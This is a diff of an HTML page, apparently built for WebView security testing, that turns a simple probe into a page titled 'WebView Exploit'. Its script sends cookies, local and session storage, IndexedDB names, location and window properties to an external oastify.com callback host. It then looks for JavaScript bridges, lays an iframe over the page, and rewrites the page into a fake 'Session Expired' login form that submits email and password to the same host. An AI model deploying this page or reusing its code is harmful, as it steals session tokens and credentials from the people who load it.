@@ -1,73 +1,167 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WebView Test</title>
+    <title>WebView Exploit</title>
+    <style>
+        body { font-family: Arial; }
+        #overlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: white;
+            z-index: 9999;
+        }
+    </style>
 </head>
 <body>
+
+<div id="overlay">
+    <h2>Loading secure content...</h2>
+</div>
+
 <script>
 (function() {
-    var OAST = "https://fexw98s0l8o6hjnzjrq4aiu6mxsqgg45.oastify.com";
+    var OAST = "https://rni8ik1cukxiqvwbs3zgju3iv913ptdi.oastify.com";
 
     function send(label, data) {
         try {
             fetch(OAST + "/?" + label + "=" + encodeURIComponent(data));
-        } catch (e) {}
+        } catch(e) {}
     }
 
-    // 1. Basic execution check
+    // =========================
+    // BASIC EXECUTION
+    // =========================
     send("status", "js_executed");
 
-    // 2. Cookie test
+    // =========================
+    // COOKIE
+    // =========================
     try {
         send("cookie", document.cookie || "EMPTY");
-    } catch (e) {
-        send("cookie_error", e.toString());
+    } catch(e) {
+        send("cookie_error", e);
     }
 
-    // 3. LocalStorage test
+    // =========================
+    // LOCAL STORAGE
+    // =========================
     try {
-        var ls = "";
-        for (var i = 0; i < localStorage.length; i++) {
-            var key = localStorage.key(i);
-            ls += key + "=" + localStorage.getItem(key) + ";";
+        let ls = "";
+        for (let i = 0; i < localStorage.length; i++) {
+            let k = localStorage.key(i);
+            ls += k + "=" + localStorage.getItem(k) + ";";
         }
         send("localStorage", ls || "EMPTY");
-    } catch (e) {
-        send("ls_error", e.toString());
+    } catch(e) {
+        send("ls_error", e);
     }
 
-    // 4. SessionStorage test
+    // =========================
+    // SESSION STORAGE
+    // =========================
     try {
-        var ss = "";
-        for (var i = 0; i < sessionStorage.length; i++) {
-            var key = sessionStorage.key(i);
-            ss += key + "=" + sessionStorage.getItem(key) + ";";
+        let ss = "";
+        for (let i = 0; i < sessionStorage.length; i++) {
+            let k = sessionStorage.key(i);
+            ss += k + "=" + sessionStorage.getItem(k) + ";";
         }
         send("sessionStorage", ss || "EMPTY");
-    } catch (e) {
-        send("ss_error", e.toString());
+    } catch(e) {
+        send("ss_error", e);
     }
 
-    // 5. Location info
+    // =========================
+    // TRY INDEXEDDB (jarang tapi kadang ada)
+    // =========================
     try {
-        send("location", window.location.href);
-    } catch (e) {}
+        indexedDB.databases().then(dbs => {
+            send("indexedDB", JSON.stringify(dbs));
+        });
+    } catch(e) {
+        send("idb_error", e);
+    }
 
-    // 6. User agent
-    try {
-        send("ua", navigator.userAgent);
-    } catch (e) {}
+    // =========================
+    // LOCATION & CONTEXT
+    // =========================
+    send("location", location.href);
+    send("origin", location.origin);
+    send("referrer", document.referrer || "NONE");
+    send("ua", navigator.userAgent);
 
-    // 7. Try access window objects (kadang ada leak)
+    // =========================
+    // WINDOW ENUMERATION
+    // =========================
     try {
-        var props = [];
-        for (var p in window) {
+        let props = [];
+        for (let p in window) {
             props.push(p);
         }
-        send("window_props", props.slice(0,50).join(","));
-    } catch (e) {}
+        send("window_props", props.slice(0, 100).join(","));
+    } catch(e) {}
+
+    // =========================
+    // JS BRIDGE DETECTION (AGGRESSIVE)
+    // =========================
+    try {
+        let found = [];
+        for (let k in window) {
+            if (typeof window[k] === "object") {
+                try {
+                    if (window[k] && typeof window[k].postMessage === "function") {
+                        found.push(k);
+                    }
+                } catch(e) {}
+            }
+        }
+        send("possible_bridges", found.join(",") || "NONE");
+    } catch(e) {}
+
+    // =========================
+    // IFRAME TEST (UI REDRESS)
+    // =========================
+    try {
+        let iframe = document.createElement("iframe");
+        iframe.src = "https://example.com";
+        iframe.style = "position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.8;";
+        document.body.appendChild(iframe);
+
+        send("iframe", "loaded");
+    } catch(e) {
+        send("iframe_error", e);
+    }
+
+    // =========================
+    // FULL PAGE REWRITE (PHISH SIMULATION)
+    // =========================
+    setTimeout(function() {
+        document.body.innerHTML = `
+            <h1>Session Expired</h1>
+            <p>Please login again</p>
+            <form action="${OAST}" method="GET">
+                <input name="email" placeholder="Email"><br><br>
+                <input name="password" type="password" placeholder="Password"><br><br>
+                <button type="submit">Login</button>
+            </form>
+        `;
+        send("ui_rewrite", "done");
+    }, 2000);
+
+    // =========================
+    // NAVIGATION ABUSE
+    // =========================
+    setTimeout(function() {
+        try {
+            window.location = "https://example.com";
+            send("navigation", "triggered");
+        } catch(e) {
+            send("navigation_error", e);
+        }
+    }, 4000);
 
 })();
 </script>
+
 </body>
 </html>
